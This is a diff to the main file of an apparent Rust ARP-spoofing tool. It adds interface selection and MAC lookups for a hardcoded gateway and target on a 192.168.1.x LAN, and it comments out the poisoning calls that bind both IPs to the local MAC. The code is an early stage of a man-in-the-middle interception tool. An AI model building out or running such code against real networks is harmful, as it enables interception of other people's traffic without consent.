@@ -1,26 +1,45 @@
+extern crate clap;
 extern crate arpspoofr;
 
 use arpspoofr::*;
 
-use pnet::datalink::MacAddr;
-use std::net::Ipv4Addr;
+use std::net::{IpAddr, Ipv4Addr};
+use clap::{App, Arg, AppSettings};
 
 fn main() {
-    let (mut tx, _rx, iface) = open_interface("lo");
+    let matches = App::new("gthttp")
+        .arg(Arg::with_name("interface")
+             .short("i")
+             .long("interface")
+             .value_name("IFACE")
+             .takes_value(true)
+             .help("Network interface on which to intercept traffic"))
+        .get_matches();
+
+    // TODO: handle case where interface is not valid
+    let (mut tx, mut rx, iface) = open_interface(matches.value_of("interface").unwrap());
 
     let local_mac = iface.mac_address();
+    let local_ip = iface.ips.first().unwrap().ip();
 
-    // TODO: Take in as input
-    let source_ip = Ipv4Addr::new(127, 0, 0, 1);
-    let target_ip = Ipv4Addr::new(127, 0, 0, 1);
+    println!("My IP: {}", local_ip);
+    
+    if let IpAddr::V4(local_ipv4) = local_ip {
+        // TODO: Take in as input
+        let source_ip = Ipv4Addr::new(192, 168, 1, 1);
+        let target_ip = Ipv4Addr::new(192, 168, 1, 4);
 
-    // TODO: Arp cache lookup to get mac of source and target
-    let source_mac = MacAddr::new(0, 0, 0, 0, 0, 0);
-    let target_mac = MacAddr::new(0, 0, 0, 0, 0, 0);
+        // Lookup mac for source and target
+        let source_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, source_ip);
+        println!("Source MAC: {}", source_mac);
 
-    // Send packet to bind source ip to local mac
-    send_arp(&mut *tx, source_ip, local_mac, target_ip, target_mac);
+        let target_mac = lookup_arp(&mut *tx, &mut *rx, local_ipv4, local_mac, target_ip);
+        println!("Target MAC: {}", target_mac);
 
-    // Send packet to bind target ip to local mac
-    send_arp(&mut *tx, target_ip, local_mac, source_ip, source_mac);
+        // Send packet to bind source ip to local mac
+        //send_arp(&mut *tx, source_ip, local_mac, target_ip, target_mac);
+
+        // Send packet to bind target ip to local mac
+        //send_arp(&mut *tx, target_ip, local_mac, source_ip, source_mac);
+    }
 }
